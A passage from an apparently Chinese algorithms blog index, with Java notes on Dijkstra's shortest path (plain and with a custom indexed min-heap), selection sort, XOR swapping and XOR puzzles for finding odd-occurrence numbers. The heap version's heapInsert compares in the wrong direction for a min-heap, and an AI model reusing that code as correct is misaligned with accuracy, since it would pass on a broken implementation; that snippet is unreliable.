generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> selectedNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> minNode <span class="token operator">=</span> <span class="token function">minDistanceUnselectedNode</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">,</span> selectedNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>minNode <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> curDistance <span class="token operator">=</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>minNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> eachEdge<span class="token operator">:</span>minNode<span class="token punctuation">.</span>edges<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> toNode <span class="token operator">=</span> eachEdge<span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>distanceMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">)</span> distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>toNode<span class="token punctuation">,</span> curDistance <span class="token operator">+</span> eachEdge<span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>toNode<span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">,</span> curDistance <span class="token operator">+</span> eachEdge<span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        selectedNodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>minNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        minNode <span class="token operator">=</span> <span class="token function">minDistanceUnselectedNode</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">,</span> selectedNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> distanceMap<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 在map中找到没有被锁死的点，而且是距离最小的点</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">minDistanceUnselectedNode</span><span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map<span class="token punctuation">,</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> minNode <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> minDistance <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> entry<span class="token operator">:</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> key <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> value <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>minDistance <span class="token operator">></span> value<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            minDistance <span class="token operator">=</span> value<span class="token punctuation">;</span>            minNode <span class="token operator">=</span> key<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> minNode<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-堆优化方案"><a href="#2-0-堆优化方案" class="headerlink" title="2.0 堆优化方案"></a>2.0 堆优化方案</h4><p>改写小根堆，使堆增加如下性质：</p><p>可以修改堆中某个节点的值，经过调整，仍然是小根堆</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> nodeRecord<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> node<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> distance<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">nodeRecord</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> distance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>node <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>distance <span class="token operator">=</span> distance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> nodeHeap<span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Node</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nodes<span class="token punctuation">;</span>    <span class="token comment">// 即记录每个节点在上一行nodes数组的下标</span>    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> nodeIndexMap<span class="token punctuation">;</span>    <span class="token comment">// 记录目前为止到该节点的距离</span>    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> distanceMap<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">nodeHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>        nodeIndexMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        distanceMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">heapInsert</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span><span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">swap</span><span class="token punctuation">(</span><span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>            index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> index <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left <span class="token operator">&lt;</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> smallest <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> heapSize<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> left <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> left<span class="token punctuation">;</span>            smallest <span class="token operator">=</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>smallest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> smallest <span class="token operator">:</span> index<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>smallest <span class="token operator">==</span> index<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>smallest<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>            index <span class="token operator">=</span> smallest<span class="token punctuation">;</span>            left <span class="token operator">=</span> index <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        nodeIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>        nodeIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> temp <span class="token operator">=</span> nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nodes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        nodes<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isEntered</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> nodeIndexMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isOnHeap</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">isEntered</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>nodeIndexMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> nodeRecord <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> node <span class="token operator">=</span> nodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        nodeRecord nr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">nodeRecord</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nodeIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        distanceMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">--</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        nodes<span class="token punctuation">[</span>size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 从来没有进入堆过，则add</span>    <span class="token comment">// 发现在堆中，但是distance更小，则update</span>    <span class="token comment">// 发现在堆中，但是并没有更小，则ignore</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addOrUpdateOrIgnore</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> distance<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEntered</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            nodes<span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">;</span>            nodeIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>            distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">heapInsert</span><span class="token punctuation">(</span>size<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isOnHeap</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">heapInsert</span><span class="token punctuation">(</span>nodeIndexMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token function">dijkstra2</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    nodeHeap heap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">nodeHeap</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    heap<span class="token punctuation">.</span><span class="token function">addOrUpdateOrIgnore</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>heap<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        nodeRecord <span class="token keyword">record</span> <span class="token operator">=</span> heap<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> <span class="token keyword">record</span><span class="token punctuation">.</span>node<span class="token punctuation">;</span>        <span class="token keyword">int</span> distance <span class="token operator">=</span> <span class="token keyword">record</span><span class="token punctuation">.</span>distance<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> edge<span class="token operator">:</span>cur<span class="token punctuation">.</span>edges<span class="token punctuation">)</span>            heap<span class="token punctuation">.</span><span class="token function">addOrUpdateOrIgnore</span><span class="token punctuation">(</span>edge<span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">,</span> distance <span class="token operator">+</span> edge<span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左程云 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>左神算法0x01</title>
      <link href="/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x01/"/>
      <url>/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x01/</url>
      
        <content type="html"><![CDATA[<p>【各种排序算法原理和应用，对数器，二分法，堆 】</p><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><p>从0开始，在[0, length-1]上找到最小值，与arr[0]交换，在[i, length-1]上找到最小值，与arr[i]交换</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">SelectionSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> minIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                minIndex <span class="token operator">=</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span>j<span class="token operator">:</span>minIndex<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> minIndex<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于<code>swap</code>函数可以采用异或运算的方法写</p><blockquote><ol><li><p> 0 xor n = n, n xor n =0</p></li><li><p> 满足交换结合律</p></li><li><p> (x1, x2, …, xn) 所有数做xor运算与顺序无关</p></li></ol><p>a = m, b = n</p><p>a = a xor b;  a = m xor n, b = n</p><p>b = a xor b;  a = m xor n, b = m xor n xor n = m</p><p>a = a xor b;  a = m xor n xor m = n, b = m</p></blockquote><blockquote><p>a和b的值可以相等，但是不能为相同地址，即不能为arr[i]和arr[i]，两者内存位置相同，会将其清空为0，所以在使用这种编写方法，一定要保证<code>int i</code>和<code>int j</code>不会相同</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Question:</p><p>数组[x1, x2, …, xn]，要求时间复杂度O(n)，空间复杂度O(1)</p><ol><li><p> 有一个数，重复奇数次，其他的数，都重复偶数次，找出这个重复奇数次的数</p></li><li><p> 有两个数，重复奇数次，其他的数，都重复偶数次，找出这两个重复奇数次的数</p></li></ol><blockquote><ol><li><p> 将数组中的所有数异或即可得到</p></li><li><p> 首先还是将数组所有数异或，假设值为m，即m=a xor b，显然a和b一定不相同（-&gt;所以m必然不为0，则m二进制形式至少有一位为1），那么以二进制角度看，a和b的二进制形式中至少有一位是不相同的，假设为第i位，不妨设a第i位为1，b则为0，那么将所有第i位为1的数做异或运算，则得出的值即为a（因为所有第i位为1的只有其他的数和a，b不可能在其中），那么由m=a xor b得 m xor a = b</p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printOddTimesNum2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> cur <span class="token operator">:</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        m <span class="token operator">^=</span> cur<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            <span class="token keyword">int</span> rightOne <span class="token operator">=</span> m <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 因为m至少有一位为1，那么找到其最右边的1，rightOne的值假设为000001000</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token 